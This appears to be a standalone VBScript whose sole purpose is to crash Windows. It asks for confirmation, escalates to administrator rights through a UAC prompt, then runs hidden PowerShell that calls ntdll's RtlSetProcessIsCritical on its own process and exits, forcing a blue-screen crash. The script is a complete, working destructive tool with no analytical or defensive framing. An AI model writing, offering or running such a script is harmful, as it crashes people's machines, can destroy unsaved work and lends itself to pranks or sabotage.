
ans = MsgBox("Are you sure for BSOD?", vbYesNo + vbCritical, "System Warning")

If ans = vbYes Then
    
    If Not WScript.Arguments.Named.Exists("elevate") Then
        CreateObject("Shell.Application").ShellExecute "wscript.exe", _
        """" & WScript.ScriptFullName & """ /elevate", "", "runas", 1
        WScript.Quit
    End If

    
    Set shell = CreateObject("WScript.Shell")
    
    psCommand = "powershell -WindowStyle Hidden -Command """ & _
    "$p = [RunspaceFactory]::CreateRunspace().Debugger;" & _
    "Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class B { [DllImport(\""ntdll.dll\"")] public static extern int RtlSetProcessIsCritical(bool b1, out bool b2, bool b3); }';" & _
    "$o = $false; [B]::RtlSetProcessIsCritical($true, [ref]$o, $false); exit"""

    shell.Run psCommand, 0, True
Else
    WScript.Quit
End If